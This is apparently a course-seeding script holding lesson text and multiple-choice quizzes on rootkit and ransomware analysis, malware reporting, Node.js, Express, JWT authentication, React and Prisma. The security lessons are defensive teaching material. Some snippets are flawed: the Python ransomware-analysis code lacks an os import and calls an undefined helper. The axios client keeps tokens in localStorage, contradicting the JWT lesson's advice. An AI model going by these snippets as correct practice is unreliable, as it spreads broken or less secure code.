Secure Boot prevents bootkit installation. Driver signing enforcement blocks unsigned kernel drivers. HVCI (Hypervisor-protected Code Integrity) prevents kernel code modification. Regular integrity checks detect unauthorized system modifications.

### Hands-On Practice

1. Use GMER to scan for hidden processes and hooks in a test system.
2. Analyze a rootkit sample using Volatility memory forensics.
3. Implement a cross-view comparison script for rootkit detection.

### Key Takeaways

- Rootkits operate at different levels of the system hierarchy
- Cross-view comparison is the most effective detection method
- Memory forensics reveals rootkit artifacts
- Secure Boot and driver signing prevent kernel-level rootkits

### References

- GMER: https://www.gmer.net/
- Rootkit Analysis: https://www.sans.org/white-papers/rootkit-analysis/
- Windows Secure Boot: https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/`,
            questions: [
              { text: 'What is the difference between user-mode and kernel-mode rootkits?', answers: [{ text: 'User-mode hooks application APIs; kernel-mode modifies OS at Ring 0', isCorrect: true }, { text: 'User-mode is more dangerous', isCorrect: false }, { text: 'They are the same', isCorrect: false }, { text: 'Kernel-mode only affects Linux', isCorrect: false }] },
              { text: 'How does cross-view comparison detect rootkits?', answers: [{ text: 'Compares output from different API levels to find hidden artifacts', isCorrect: true }, { text: 'Scans for known signatures only', isCorrect: false }, { text: 'Monitors network traffic', isCorrect: false }, { text: 'Checks file permissions', isCorrect: false }] },
              { text: 'What tool is commonly used for rootkit detection?', answers: [{ text: 'GMER', isCorrect: true }, { text: 'Wireshark', isCorrect: false }, { text: 'Nmap', isCorrect: false }, { text: 'curl', isCorrect: false }] },
              { text: 'What type of rootkit infects the Master Boot Record?', answers: [{ text: 'Bootkit', isCorrect: true }, { text: 'User-mode rootkit', isCorrect: false }, { text: 'Fileless malware', isCorrect: false }, { text: 'Spyware', isCorrect: false }] },
            ],
          },
          {
            title: 'Ransomware Analysis & Decryption',
            order: 3,
            content: `# Ransomware Analysis & Decryption

### Learning Objectives

- Analyze ransomware encryption mechanisms
- Identify potential decryption opportunities
- Document ransomware families and their characteristics
- Respond to ransomware incidents effectively

### Section 1: Ransomware Mechanics

Ransomware encrypts files using symmetric (AES) and asymmetric (RSA) encryption. Key management varies: some use hardcoded keys (decryptable), others use per-machine keys with C2 communication. Understanding the encryption implementation reveals decryption opportunities.

### Section 2: Analysis Approaches

Static analysis reveals encryption algorithms and key handling. Dynamic analysis in a sandbox captures encryption behavior and network communication. Memory analysis may reveal encryption keys before they are destroyed. Code analysis identifies weaknesses in key management.

\`\`\`python
# Analyze ransomware encryption patterns
import hashlib
from collections import defaultdict

def analyze_encryption_pattern(sample_dir):
    original_hashes = {}
    encrypted_hashes = {}

    for root, dirs, files in os.walk(sample_dir):
        for f in files:
            filepath = os.path.join(root, f)
            with open(filepath, 'rb') as fh:
                content = fh.read()
                hash_val = hashlib.sha256(content).hexdigest()

                if f.endswith('.encrypted'):
                    encrypted_hashes[filepath] = hash_val
                else:
                    original_hashes[filepath] = hash_val

    # Compare patterns to identify encryption method
    return {
        'original_count': len(original_hashes),
        'encrypted_count': len(encrypted_hashes),
        'encryption_pattern': identify_pattern(encrypted_hashes)
    }
\`\`\`

### Section 3: Decryption Opportunities

Weaknesses that enable decryption: hardcoded keys, weak key derivation, insecure random number generation, and key storage in memory. No More Ransom project provides free decryption tools for many ransomware families. Always check for available decryptors before considering payment.

### Section 4: Incident Response

Ransomware response priorities: contain the spread, preserve evidence, assess scope, check backup integrity, evaluate decryption options, and plan recovery. Never pay ransom without exhausting all alternatives. Document everything for potential law enforcement involvement.

### Hands-On Practice

1. Analyze a ransomware sample to identify the encryption algorithm and key management.
2. Check the No More Ransom project for available decryption tools.
3. Develop a ransomware incident response playbook.

### Key Takeaways

- Ransomware uses both symmetric and asymmetric encryption
- Key management weaknesses may enable decryption
- No More Ransom provides free decryption tools
- Response must balance containment with evidence preservation

### References

- No More Ransom: https://www.nomoreransom.org/
- Ransomware Analysis: https://www.sans.org/white-papers/ransomware-analysis/
- ID Ransomware: https://id-ransomware.malwarehunterteam.com/`,
            questions: [
              { text: 'What encryption types do modern ransomware typically use?', answers: [{ text: 'Both symmetric (AES) and asymmetric (RSA) encryption', isCorrect: true }, { text: 'Only DES encryption', isCorrect: false }, { text: 'Only XOR encryption', isCorrect: false }, { text: 'No encryption, just file renaming', isCorrect: false }] },
              { text: 'Where might encryption keys be found during analysis?', answers: [{ text: 'In memory before they are destroyed', isCorrect: true }, { text: 'In the registry only', isCorrect: false }, { text: 'On a USB drive', isCorrect: false }, { text: 'In DNS records', isCorrect: false }] },
              { text: 'What resource provides free ransomware decryption tools?', answers: [{ text: 'No More Ransom project', isCorrect: true }, { text: 'Microsoft website', isCorrect: false }, { text: 'Google search', isCorrect: false }, { text: 'Social media', isCorrect: false }] },
              { text: 'What should be the first priority in ransomware response?', answers: [{ text: 'Contain the spread and preserve evidence', isCorrect: true }, { text: 'Pay the ransom immediately', isCorrect: false }, { text: 'Reboot all systems', isCorrect: false }, { text: 'Delete all encrypted files', isCorrect: false }] },
            ],
          },
          {
            title: 'Malware Report Writing',
            order: 4,
            content: `# Malware Report Writing

### Learning Objectives

- Write comprehensive malware analysis reports
- Extract and format IOCs for sharing
- Contribute to threat intelligence communities
- Use MISP for IOC management

### Section 1: Report Structure

A malware analysis report should include: Executive Summary for non-technical readers, Technical Analysis with detailed findings, IOCs for detection, Recommendations for remediation, and Appendix with supporting evidence. The executive summary should provide a high-level overview that enables decision-making without requiring technical expertise.

### Section 2: IOC Extraction and Formatting

\`\`\`json
{
  "indicators": [
    {"type": "md5", "value": "abc123...", "context": "malware sample"},
    {"type": "domain", "value": "evil-c2.example.com", "context": "C2 server"},
    {"type": "ip", "value": "192.168.1.100", "context": "C2 IP"},
    {"type": "filename", "value": "svchost_update.exe", "context": "dropped file"}
  ],
  "ttps": ["T1059.001", "T1071.001", "T1547.001"]
}
\`\`\`

### Section 3: MISP Integration

MISP enables structured IOC sharing. Create events with indicators, tag with threat intelligence, and share with trusted communities. STIX and TAXII provide standardized formats for automated exchange.

### Section 4: Threat Intelligence Sharing

ISACs facilitate industry-specific sharing. Contributing useful intelligence strengthens the community. Classification procedures protect sensitive information while enabling effective sharing.

### Hands-On Practice

1. Write a comprehensive malware analysis report based on a real sample.
2. Extract and format IOCs in STIX format for sharing.
3. Submit findings to a threat intelligence sharing platform.

### Key Takeaways

- Reports must serve both technical and non-technical audiences
- IOCs should be in structured, machine-readable formats
- MISP enables community-driven threat intelligence sharing
- Contributing intelligence strengthens the security community

### References

- MISP: https://www.misp-project.org/
- STIX/TAXII: https://oasis-open.github.io/cti-documentation/
- SANS Report Writing: https://www.sans.org/white-papers/`,
            questions: [
              { text: 'What section is for non-technical decision makers?', answers: [{ text: 'Executive Summary', isCorrect: true }, { text: 'Technical Analysis', isCorrect: false }, { text: 'Appendix', isCorrect: false }, { text: 'IOC List', isCorrect: false }] },
              { text: 'What does MISP stand for?', answers: [{ text: 'Malware Information Sharing Platform', isCorrect: true }, { text: 'Malicious Intent Security Protocol', isCorrect: false }, { text: 'Multiple Indicator Sharing Platform', isCorrect: false }, { text: 'Managed Intrusion Scan System', isCorrect: false }] },
              { text: 'What provides standardized threat intelligence exchange?', answers: [{ text: 'STIX and TAXII', isCorrect: true }, { text: 'HTTP and FTP', isCorrect: false }, { text: 'DNS and DHCP', isCorrect: false }, { text: 'SMTP and POP3', isCorrect: false }] },
              { text: 'Why should IOCs be machine-readable?', answers: [{ text: 'Enables automated detection and correlation across tools', isCorrect: true }, { text: 'Makes reports longer', isCorrect: false }, { text: 'Copyright compliance', isCorrect: false }, { text: 'Reduces file size', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 4. Full-Stack JavaScript Development
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Full-Stack JavaScript Development',
    'Complete full-stack JavaScript course covering Node.js, Express, React, database integration with ORMs, testing strategies, and deployment with DevOps practices. Students will build production-ready applications from frontend to backend.',
    40,
    [
      {
        title: 'Node.js & Express Fundamentals',
        order: 1,
        lessons: [
          {
            title: 'Node.js Runtime & Event Loop',
            order: 1,
            content: `# Node.js Runtime & Event Loop

### Learning Objectives

- Understand the Node.js runtime architecture
- Explain the event loop and its phases
- Use non-blocking I/O for concurrent operations
- Implement Streams for efficient data processing

### Section 1: Node.js Architecture

Node.js is a JavaScript runtime built on Chrome V8 engine. It uses a single-threaded event loop with non-blocking I/O to handle concurrent operations efficiently. Unlike traditional thread-per-request models, Node.js can handle thousands of simultaneous connections with minimal overhead.

### Section 2: The Event Loop

The event loop continuously checks for pending operations and executes callbacks when operations complete. It operates in phases: timers (setTimeout, setInterval), pending callbacks, idle/prepare, poll (new I/O events), check (setImmediate), and close callbacks.

\`\`\`javascript
// Understanding event loop order
console.log('1. Synchronous');
setTimeout(() => console.log('2. Timer'), 0);
setImmediate(() => console.log('3. Check'));
Promise.resolve().then(() => console.log('4. Microtask'));
console.log('5. Synchronous');
// Output: 1, 5, 4, 2, 3
\`\`\`

### Section 3: Non-Blocking I/O

Node.js delegates I/O operations to the system kernel. While waiting for I/O, the event loop continues processing other operations. This enables high throughput with minimal resource usage.

\`\`\`javascript
const fs = require('fs').promises;

async function readMultipleFiles() {
  const [config, data] = await Promise.all([
    fs.readFile('config.json', 'utf8'),
    fs.readFile('data.json', 'utf8')
  ]);
  return { config: JSON.parse(config), data: JSON.parse(data) };
}
\`\`\`

### Section 4: Streams

Streams process data in chunks rather than loading entire files into memory. They are essential for handling large files and network data efficiently. Four types: Readable, Writable, Duplex, and Transform.

### Hands-On Practice

1. Build a simple HTTP server demonstrating non-blocking request handling.
2. Create a file processing pipeline using streams for large log files.
3. Analyze event loop behavior with a benchmark comparing sync vs async operations.

### Key Takeaways

- Node.js uses a single-threaded event loop with non-blocking I/O
- Microtasks (Promises) run between event loop phases
- Streams enable efficient processing of large data
- Understanding the event loop prevents common concurrency bugs

### References

- Node.js Documentation: https://nodejs.org/en/docs/
- libuv Documentation: https://docs.libuv.org/
- Node.js Best Practices: https://github.com/goldbergyoni/nodebestpractices`,
            questions: [
              { text: 'What makes Node.js suitable for high-concurrency?', answers: [{ text: 'Single-threaded event loop with non-blocking I/O', isCorrect: true }, { text: 'Uses multiple threads per request', isCorrect: false }, { text: 'Requires less memory', isCorrect: false }, { text: 'Only supports synchronous operations', isCorrect: false }] },
              { text: 'When do microtasks execute in the event loop?', answers: [{ text: 'Between phases, before timers or check callbacks', isCorrect: true }, { text: 'After all callbacks', isCorrect: false }, { text: 'Only during poll phase', isCorrect: false }, { text: 'Never, they run immediately', isCorrect: false }] },
              { text: 'What is the benefit of non-blocking I/O?', answers: [{ text: 'Enables handling thousands of concurrent connections efficiently', isCorrect: true }, { text: 'Makes code simpler to write', isCorrect: false }, { text: 'Uses less memory than blocking I/O', isCorrect: false }, { text: 'Is required for all JavaScript', isCorrect: false }] },
              { text: 'What are Streams used for?', answers: [{ text: 'Processing data in chunks without loading entire files into memory', isCorrect: true }, { text: 'Creating web servers only', isCorrect: false }, { text: 'Database connections only', isCorrect: false }, { text: 'File deletion only', isCorrect: false }] },
            ],
          },
          {
            title: 'Express.js REST API',
            order: 2,
            content: `# Express.js REST API

### Learning Objectives

- Build RESTful APIs with Express.js
- Implement route handling and middleware
- Design proper API resource modeling
- Handle errors gracefully in API endpoints

### Section 1: Express.js Fundamentals

Express.js is a minimal, flexible Node.js web framework providing robust routing, middleware support, and HTTP utility methods. It provides the foundation for building RESTful APIs with clean resource-based URLs.

\`\`\`javascript
const express = require('express');
const app = express();

app.use(express.json());

app.get('/api/users', async (req, res) => {
  const users = await User.findAll();
  res.json({ data: users, count: users.length });
});

app.post('/api/users', async (req, res) => {
  const user = await User.create(req.body);
  res.status(201).json({ data: user });
});

app.listen(3000);
\`\`\`

### Section 2: Route Design

RESTful routes follow HTTP method conventions: GET for retrieval, POST for creation, PUT for full replacement, PATCH for partial updates, DELETE for removal. Resource URLs should be nouns, not verbs. Nested resources express relationships.

### Section 3: Middleware Pattern

Middleware functions execute sequentially, processing request and response objects. They handle authentication, logging, validation, error handling, and cross-cutting concerns. Express middleware is composable and reusable.

### Section 4: Error Handling

Centralized error handling middleware catches and formats errors consistently. Custom error classes enable typed error responses. Async error handling with try-catch or express-async-errors prevents unhandled rejections.

### Hands-On Practice

1. Build a complete REST API for a blog application with CRUD operations.
2. Implement authentication middleware using JWT tokens.
3. Create a centralized error handling system with custom error classes.

### Key Takeaways

- RESTful APIs follow HTTP method conventions
- Middleware provides composable request processing
- Centralized error handling ensures consistent responses
- Proper route design improves API usability

### References

- Express.js Guide: https://expressjs.com/
- RESTful API Design: https://restfulapi.net/
- Best Practices: https://github.com/shellfarmer/Express-REST-API-Best-Practices`,
            questions: [
              { text: 'What HTTP method is used to create a new resource?', answers: [{ text: 'POST', isCorrect: true }, { text: 'GET', isCorrect: false }, { text: 'PUT', isCorrect: false }, { text: 'DELETE', isCorrect: false }] },
              { text: 'What is the purpose of Express middleware?', answers: [{ text: 'Process request and response objects in a composable pipeline', isCorrect: true }, { text: 'Create database connections', isCorrect: false }, { text: 'Generate HTML templates', isCorrect: false }, { text: 'Manage file systems', isCorrect: false }] },
              { text: 'How should API errors be handled?', answers: [{ text: 'Centralized error handling middleware with consistent formatting', isCorrect: true }, { text: 'Each route handles its own errors', isCorrect: false }, { text: 'Errors should be ignored', isCorrect: false }, { text: 'Only log errors to console', isCorrect: false }] },
              { text: 'What should REST API URLs represent?', answers: [{ text: 'Nouns representing resources, not verbs', isCorrect: true }, { text: 'Actions the API performs', isCorrect: false }, { text: 'Database table names only', isCorrect: false }, { text: 'Function names', isCorrect: false }] },
            ],
          },
          {
            title: 'Authentication & JWT',
            order: 3,
            content: `# Authentication & JWT

### Learning Objectives

- Implement JWT-based authentication in Express.js
- Understand token structure and security best practices
- Implement refresh token patterns
- Secure API endpoints with proper authentication

### Section 1: JWT Structure

JSON Web Tokens consist of three parts: header (algorithm and token type), payload (claims and user data), and signature (integrity verification). JWTs are stateless — the server does not store session data. The token itself contains all necessary information.

\`\`\`javascript
const jwt = require('jsonwebtoken');

function generateTokens(user) {
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}
\`\`\`

### Section 2: Authentication Flow

1. User submits credentials
2. Server validates and issues access + refresh tokens
3. Client stores tokens (httpOnly cookie recommended)
4. Client sends access token in Authorization header
5. Server validates token and processes request
6. When access token expires, client uses refresh token to get new access token

### Section 3: Security Best Practices

Use short-lived access tokens (15-30 minutes). Store tokens in httpOnly, secure cookies. Implement token rotation for refresh tokens. Validate tokens on every request. Use HTTPS only. Consider token blacklisting for logout.

### Section 4: Role-Based Access Control

Implement RBAC by including role information in the JWT payload. Create middleware that checks user roles against required permissions. Use granular permissions for fine-grained access control.

### Hands-On Practice

1. Implement a complete JWT authentication system with login, registration, and token refresh.
2. Create role-based middleware for protecting API endpoints.
3. Implement secure token storage using httpOnly cookies.

### Key Takeaways

- JWTs are stateless tokens containing user identity and claims
- Short-lived access tokens reduce the impact of token theft
- Refresh tokens enable persistent sessions without long-lived access tokens
- RBAC middleware provides fine-grained access control

### References

- JWT.io: https://jwt.io/
- JWT Best Practices: https://datatracker.ietf.org/doc/html/rfc7519
- OWASP JWT Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html`,
            questions: [
              { text: 'What are the three parts of a JWT?', answers: [{ text: 'Header, payload, and signature', isCorrect: true }, { text: 'Username, password, and token', isCorrect: false }, { text: 'Request, response, and session', isCorrect: false }, { text: 'Public key, private key, and certificate', isCorrect: false }] },
              { text: 'Why should access tokens have short lifetimes?', answers: [{ text: 'Reduces the impact of token theft', isCorrect: true }, { text: 'Improves server performance', isCorrect: false }, { text: 'Reduces network bandwidth', isCorrect: false }, { text: 'Simplifies token validation', isCorrect: false }] },
              { text: 'Where should JWT tokens be stored?', answers: [{ text: 'httpOnly, secure cookies', isCorrect: true }, { text: 'localStorage', isCorrect: false }, { text: 'Session storage', isCorrect: false }, { text: 'Global JavaScript variables', isCorrect: false }] },
              { text: 'What is the purpose of refresh tokens?', answers: [{ text: 'Enable persistent sessions without long-lived access tokens', isCorrect: true }, { text: 'Replace access tokens entirely', isCorrect: false }, { text: 'Speed up authentication', isCorrect: false }, { text: 'Reduce server load', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'React & Frontend Architecture',
        order: 2,
        lessons: [
          {
            title: 'React Component Patterns',
            order: 1,
            content: `# React Component Patterns

### Learning Objectives

- Implement common React component patterns
- Use hooks for state management and side effects
- Build reusable component libraries
- Apply performance optimization techniques

### Section 1: Component Composition

React components are composable building blocks. Composition over inheritance is the React philosophy. Use children prop, render props, and higher-order components to compose complex UIs from simple pieces.

\`\`\`jsx
// Composition with children
function Card({ children, title }) {
  return (
    <div className="card">
      <h3>{title}</h3>
      <div className="card-body">{children}</div>
    </div>
  );
}

// Render props pattern
function DataFetcher({ url, children }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(url).then(r => r.json()).then(d => {
      setData(d);
      setLoading(false);
    });
  }, [url]);

  return children({ data, loading });
}
\`\`\`

### Section 2: Custom Hooks

Custom hooks encapsulate reusable stateful logic. They follow the "use" naming convention and can call other hooks. Common patterns include useLocalStorage, useDebounce, useApi, and useAuth.

### Section 3: State Management

Local state with useState for component-specific data. Context API for shared state. Redux, Zustand, or Jotai for complex application state. Server state with React Query or SWR for caching and synchronization.

### Section 4: Performance Optimization

React.memo prevents unnecessary re-renders. useMemo caches expensive calculations. useCallback stabilizes function references. Code splitting with React.lazy and Suspense. Virtualization with react-window for large lists.

### Hands-On Practice

1. Build a reusable component library with Card, Modal, and DataTable components.
2. Create custom hooks for API calls and local storage persistence.
3. Optimize a slow-rendering list using virtualization.

### Key Takeaways

- Composition over inheritance is the React philosophy
- Custom hooks encapsulate reusable stateful logic
- Server state management differs from client state
- Performance optimization requires measurement before optimization

### References

- React Documentation: https://react.dev/
- React Patterns: https://reactpatterns.com/
- Kent C. Dodds Blog: https://kentcdodds.com/blog`,
            questions: [
              { text: 'What is the React philosophy for building UIs?', answers: [{ text: 'Composition over inheritance', isCorrect: true }, { text: 'Inheritance over composition', isCorrect: false }, { text: 'Classes over functions', isCorrect: false }, { text: 'State over props', isCorrect: false }] },
              { text: 'What is the purpose of custom hooks?', answers: [{ text: 'Encapsulate reusable stateful logic', isCorrect: true }, { text: 'Replace built-in hooks', isCorrect: false }, { text: 'Improve performance only', isCorrect: false }, { text: 'Handle routing', isCorrect: false }] },
              { text: 'When should you use React.memo?', answers: [{ text: 'To prevent unnecessary re-renders of pure components', isCorrect: true }, { text: 'For all components always', isCorrect: false }, { text: 'Only for class components', isCorrect: false }, { text: 'To handle side effects', isCorrect: false }] },
              { text: 'What manages server state in React?', answers: [{ text: 'React Query or SWR for caching and synchronization', isCorrect: true }, { text: 'useState only', isCorrect: false }, { text: 'Redux only', isCorrect: false }, { text: 'Context API only', isCorrect: false }] },
            ],
          },
          {
            title: 'State Management',
            order: 2,
            content: `# State Management

### Learning Objectives

- Choose appropriate state management solutions
- Implement global state with Context API and reducers
- Use server state libraries for API data
- Manage complex state with state machines

### Section 1: State Categories

Client state: UI state, form data, toggle states. Server state: API responses, cached data. URL state: query parameters, route state. Derived state: computed values from other state. Each category requires different management approaches.

### Section 2: Context API Pattern

Context provides a way to pass data through the component tree without prop drilling. Combine with useReducer for complex state logic.

\`\`\`jsx
const AppContext = createContext();

function AppProvider({ children }) {
  const [state, dispatch] = useReducer(appReducer, initialState);

  return (
    <AppContext.Provider value={{ state, dispatch }}>
      {children}
    </AppContext.Provider>
  );
}

function useApp() {
  const context = useContext(AppContext);
  if (!context) throw new Error('useApp must be used within AppProvider');
  return context;
}
\`\`\`

### Section 3: Server State Management

React Query manages server state with caching, background refetching, and optimistic updates. SWR provides stale-while-revalidate caching. Both handle loading states, error states, and data synchronization automatically.

### Section 4: State Machines

XState implements finite state machines for complex state logic. State machines prevent invalid state transitions and make state logic explicit and testable.

### Hands-On Practice

1. Implement a shopping cart using Context API and useReducer.
2. Set up React Query for server state management with caching.
3. Model a multi-step form as a state machine using XState.

### Key Takeaways

- Different state categories require different management approaches
- Context API handles global client state
- Server state requires caching and synchronization
- State machines prevent invalid state transitions

### References

- React Context: https://react.dev/learn/passing-data-deeply-with-context
- React Query: https://tanstack.com/query
- XState: https://xstate.js.org/`,
            questions: [
              { text: 'What are the main categories of state in a React app?', answers: [{ text: 'Client state, server state, URL state, and derived state', isCorrect: true }, { text: 'Only local and global state', isCorrect: false }, { text: 'Only Redux state', isCorrect: false }, { text: 'Only form state', isCorrect: false }] },
              { text: 'What does React Query primarily manage?', answers: [{ text: 'Server state with caching and synchronization', isCorrect: true }, { text: 'Client UI state', isCorrect: false }, { text: 'URL routing', isCorrect: false }, { text: 'Form validation', isCorrect: false }] },
              { text: 'What benefit do state machines provide?', answers: [{ text: 'Prevent invalid state transitions and make logic explicit', isCorrect: true }, { text: 'Improve rendering performance', isCorrect: false }, { text: 'Reduce bundle size', isCorrect: false }, { text: 'Simplify CSS', isCorrect: false }] },
              { text: 'What problem does Context API solve?', answers: [{ text: 'Prop drilling by providing data through the component tree', isCorrect: true }, { text: 'API data fetching', isCorrect: false }, { text: 'File system access', isCorrect: false }, { text: 'Database connections', isCorrect: false }] },
            ],
          },
          {
            title: 'API Integration',
            order: 3,
            content: `# API Integration

### Learning Objectives

- Implement API client architecture in React
- Handle loading, error, and success states
- Implement optimistic updates
- Handle authentication and token refresh in API calls

### Section 1: API Client Architecture

Create a centralized API client with interceptors for authentication, error handling, and request/response transformation. Axios or fetch with custom wrappers provide consistent API interaction patterns.

\`\`\`javascript
import axios from 'axios';

const api = axios.create({
  baseURL: process.env.REACT_APP_API_URL,
  timeout: 10000,
});

api.interceptors.request.use(config => {
  const token = localStorage.getItem('accessToken');
  if (token) config.headers.Authorization = \`Bearer \${token}\`;
  return config;
});

api.interceptors.response.use(
  response => response,
  async error => {
    if (error.response?.status === 401) {
      const newToken = await refreshToken();
      error.config.headers.Authorization = \`Bearer \${newToken}\`;
      return api(error.config);
    }
    return Promise.reject(error);
  }
);
\`\`\`

### Section 2: Loading and Error States

Every API call needs loading, error, and success state handling. Create reusable patterns that handle all three states consistently. Error boundaries catch rendering errors from failed API data.

### Section 3: Optimistic Updates

Optimistic updates update the UI immediately before the server confirms the change. If the server rejects the change, rollback to the previous state. This provides instant feedback while maintaining data consistency.

### Section 4: Data Caching

Cache API responses to reduce redundant requests. Implement cache invalidation strategies. Use stale-while-revalidate for fresh data with fallback to cached data.

### Hands-On Practice

1. Build a centralized API client with request/response interceptors.
2. Implement optimistic updates for a todo application.
3. Create a data caching layer with automatic invalidation.

### Key Takeaways

- Centralized API clients ensure consistent error handling
- Optimistic updates provide instant user feedback
- Token refresh should be handled transparently
- Caching reduces redundant requests and improves UX

### References

- Axios Documentation: https://axios-http.com/
- React Query Caching: https://tanstack.com/query
- Optimistic Updates: https://react.dev/`,
            questions: [
              { text: 'What is the purpose of API interceptors?', answers: [{ text: 'Handle authentication, errors, and transformation centrally', isCorrect: true }, { text: 'Cache API responses only', isCorrect: false }, { text: 'Generate API documentation', isCorrect: false }, { text: 'Monitor API performance', isCorrect: false }] },
              { text: 'What are optimistic updates?', answers: [{ text: 'Updating UI before server confirmation with rollback on failure', isCorrect: true }, { text: 'Updating UI after server confirmation', isCorrect: false }, { text: 'Ignoring server responses', isCorrect: false }, { text: 'Disabling user interactions', isCorrect: false }] },
              { text: 'Why handle token refresh in interceptors?', answers: [{ text: 'To transparently refresh expired tokens without disrupting the user', isCorrect: true }, { text: 'To prevent all API errors', isCorrect: false }, { text: 'To cache tokens permanently', isCorrect: false }, { text: 'To avoid using tokens', isCorrect: false }] },
              { text: 'What is stale-while-revalidate?', answers: [{ text: 'Showing cached data immediately while fetching fresh data in background', isCorrect: true }, { text: 'Deleting all cached data', isCorrect: false }, { text: 'Never caching data', isCorrect: false }, { text: 'Only using cached data', isCorrect: false }] },
            ],
          },
          {
            title: 'Performance Optimization',
            order: 4,
            content: `# Performance Optimization

### Learning Objectives

- Profile and identify React performance bottlenecks
- Implement code splitting and lazy loading
- Optimize bundle size and rendering performance
- Use performance monitoring tools

### Section 1: Profiling Performance

React DevTools Profiler identifies slow renders. Chrome DevTools Performance tab shows JavaScript execution. Lighthouse measures overall web performance. Always measure before optimizing.

### Section 2: Code Splitting

React.lazy and Suspense enable component-level code splitting. Route-based splitting loads only the code needed for the current page. Dynamic imports split at the module level.

\`\`\`javascript
const Dashboard = React.lazy(() => import('./pages/Dashboard'));
const Settings = React.lazy(() => import('./pages/Settings'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Suspense>
  );
}
\`\`\`

### Section 3: Rendering Optimization

React.memo wraps components to skip re-renders when props are unchanged. useMemo caches expensive computations. useCallback stabilizes function references passed as props. Avoid creating new objects/arrays in render.

### Section 4: Bundle Optimization

Tree shaking eliminates unused code. Analyze bundle with webpack-bundle-analyzer. Minimize dependencies. Use dynamic imports for heavy libraries. Implement proper caching headers.

### Hands-On Practice

1. Profile a React application and identify the top three performance bottlenecks.
2. Implement route-based code splitting with React.lazy.
3. Optimize a slow list component using memoization and virtualization.

### Key Takeaways

- Always measure before optimizing
- Code splitting reduces initial load time
- Memoization prevents unnecessary re-renders
- Bundle analysis identifies optimization opportunities

### References

- React Performance: https://react.dev/learn
- Web Vitals: https://web.dev/vitals/
- Bundle Analyzer: https://github.com/webpack-contrib/webpack-bundle-analyzer`,
            questions: [
              { text: 'What should you do before optimizing React performance?', answers: [{ text: 'Profile and measure to identify actual bottlenecks', isCorrect: true }, { text: 'Apply memoization to all components', isCorrect: false }, { text: 'Reduce all state to useState', isCorrect: false }, { text: 'Remove all dependencies', isCorrect: false }] },
              { text: 'What does React.lazy enable?', answers: [{ text: 'Component-level code splitting with lazy loading', isCorrect: true }, { text: 'Faster state updates', isCorrect: false }, { text: 'Smaller bundle size only', isCorrect: false }, { text: 'Better error handling', isCorrect: false }] },
              { text: 'What does tree shaking do?', answers: [{ text: 'Eliminates unused code from the bundle', isCorrect: true }, { text: 'Removes unused React components', isCorrect: false }, { text: 'Deletes unused state', isCorrect: false }, { text: 'Cleans up unused CSS', isCorrect: false }] },
              { text: 'What tool analyzes bundle composition?', answers: [{ text: 'webpack-bundle-analyzer', isCorrect: true }, { text: 'React DevTools only', isCorrect: false }, { text: 'ESLint only', isCorrect: false }, { text: 'Prettier only', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Database Integration & ORM',
        order: 3,
        lessons: [
          {
            title: 'PostgreSQL with Prisma',
            order: 1,
            content: `# PostgreSQL with Prisma

### Learning Objectives

- Set up Prisma ORM for PostgreSQL database
- Design database schemas using Prisma
- Implement CRUD operations with type safety
- Use Prisma migrations for schema management

### Section 1: Prisma Setup

Prisma is a modern ORM providing type-safe database access. Schema-first approach defines data models in schema.prisma. Migrations track schema changes. The Prisma Client provides auto-generated, type-safe queries.

\`\`\`prisma
// schema.prisma
generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

model User {
  id        Int      @id @default(autoincrement())
  email     String   @unique
  name      String?
  posts     Post[]
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
}

model Post {
  id        Int      @id @default(autoincrement())
  title     String
  content   String?
  published Boolean  @default(false)
  author    User     @relation(fields: [authorId], references: [id])
  authorId  Int
}
\`\`\`

### Section 2: CRUD Operations

Prisma Client provides create, findMany, findUnique, update, and delete operations. All operations are type-safe and support filtering, sorting, pagination, and relations.

### Section 3: Relations and Queries

Prisma supports one-to-one, one-to-many, and many-to-many relations. Include relations in queries with the include option. Filter on related records using where clauses.

### Section 4: Migrations

prisma migrate dev creates migration files. prisma migrate deploy applies migrations to production. Migrations are version-controlled and provide a complete schema history.

### Hands-On Practice

1. Set up a Prisma project with PostgreSQL and define a schema for a blog application.
2. Implement all CRUD operations with proper error handling.
3. Create and apply migrations for schema changes.

### Key Takeaways

- Prisma provides type-safe database access
- Schema-first approach ensures data model consistency
- Migrations track and apply schema changes safely
- Relations enable complex data queries

### References

- Prisma Documentation: https://www.prisma.io/docs
- Prisma Examples: https://github.com/prisma/prisma-examples
- PostgreSQL Docs: https://www.postgresql.org/docs/`,
            questions: [
              { text: 'What approach does Prisma use for schema definition?', answers: [{ text: 'Schema-first approach with schema.prisma file', isCorrect: true }, { text: 'Code-first approach only', isCorrect: false }, { text: 'Database-first approach', isCorrect: false }, { text: 'No schema required', isCorrect: false }] },
              { text: 'What command applies migrations to production?', answers: [{ text: 'prisma migrate deploy', isCorrect: true }, { text: 'prisma migrate dev', isCorrect: false }, { text: 'prisma db push', isCorrect: false }, { text: 'prisma generate', isCorrect: false }] },
              { text: 'What does the Prisma Client provide?', answers: [{ text: 'Auto-generated, type-safe database queries', isCorrect: true }, { text: 'Database hosting only', isCorrect: false }, { text: 'Schema visualization only', isCorrect: false }, { text: 'Migration rollback only', isCorrect: false }] },
              { text: 'What types of relations does Prisma support?', answers: [{ text: 'One-to-one, one-to-many, and many-to-many', isCorrect: true }, { text: 'Only one-to-many', isCorrect: false }, { text: 'Only one-to-one', isCorrect: false }, { text: 'No relations', isCorrect: false }] },
            ],
          },
          {
            title: 'MongoDB with Mongoose',
            order: 2,
            content: `# MongoDB with Mongoose

### Learning Objectives

- Design MongoDB document schemas with Mongoose
